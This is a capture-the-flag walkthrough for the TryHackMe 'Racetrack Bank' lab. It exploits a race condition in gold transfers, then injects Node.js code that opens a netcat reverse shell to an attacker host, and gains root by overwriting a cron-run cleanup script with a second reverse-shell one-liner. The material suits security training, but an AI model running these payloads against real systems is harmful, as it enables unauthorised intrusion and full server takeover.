# [Racetrack Bank](https://tryhackme.com/room/racetrackbank)

## It's time for another heist

# Flags

## Hack into the machine and capture both the user and root flags! It's pretty hard, so good luck.

### User flag

_What does the name of the bank hint at?_

1. Perform network reconnaissance to identify available services

```bash
nmap -sV <TARGET_IP>
```

<img width="722" height="180" alt="SCREEN01" src="https://github.com/user-attachments/assets/eb3b4796-da69-4504-8d8a-bd9893661a72" />

2. Navigate to `http://<TARGET_IP>` and register a new user account. After logging in, examine the application functionality, particularly the gold transfer mechanism and premium account purchase option at `http://<TARGET_IP>/purchase.html`

3. Create a second user account to facilitate the race condition attack
   - Configure Burp Suite as a proxy and intercept traffic
   - Initiate a gold transfer from the first account to the second account
   - Capture the POST request containing the transfer parameters
   - Create a second POST request to transfer gold back from the second account to the first account
   - Group both requests in Burp Suite's Repeater tool
   - Execute "Send group (parallel)" repeatedly while gradually increasing the transfer amounts

This race condition occurs when the application fails to properly synchronize balance checks and updates, allowing multiple transactions to process simultaneously before balance validation completes.

<img width="1054" height="474" alt="SCREEN02" src="https://github.com/user-attachments/assets/f7e88ecb-5c7f-4ace-ad21-dc3e55e8222f" />

4. After accumulating sufficient gold through the race condition, purchase the premium account upgrade. This unlocks access to `http://<TARGET_IP>/premiumfeatures.html`.

<img width="1383" height="439" alt="SCREEN03" src="https://github.com/user-attachments/assets/32752c54-bbaf-453e-9354-0adc7e9da6e0" />

5. Prepare a netcat listener on the attacking machine

```bash
nc -lvnp 4444
```

6. The premium features page contains a Node.js code execution vulnerability. Input the following payload to establish a reverse shell:

```javascript
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f')
```

7. Once the reverse shell connection is established, navigate to the user directory and retrieve the user flag

```bash
cat /home/brian
```

<img width="717" height="430" alt="SCREEN04" src="https://github.com/user-attachments/assets/451d410d-915e-48dc-9ae2-5b5c87fc3d19" />

---

### Root flag

_Experiment and be creative._

1. After gaining initial access as the `brian` user, conduct enumeration to identify privilege escalation vectors
   - Investigation reveals a cleanup directory in `/home/brian/cleanup` containing automated scripts

```bash
find / -perm -4000 2>/dev/null
crontab -l
ls -la /home/brian
```

2. Set up a new netcat listener for the privilege escalation

```bash
nc -lvnp 5555
```

3. The system runs periodic cleanup tasks that execute scripts from the cleanup directory. Exploit this by replacing the existing cleanup script

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
cd /home/brian/cleanup
rm -f cleanupscript.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 5555 >/tmp/f' > cleanupscript.sh
chmod +x cleanupscript.sh
```

4. Wait for the cron job to execute the modified script

```bash
whoami
# Confirms root access
ls /root
cat /root/root.txt
```

<img width="474" height="183" alt="SCREEN05" src="https://github.com/user-attachments/assets/46c2dd62-5dee-4f65-a307-8036da1c9f90" />
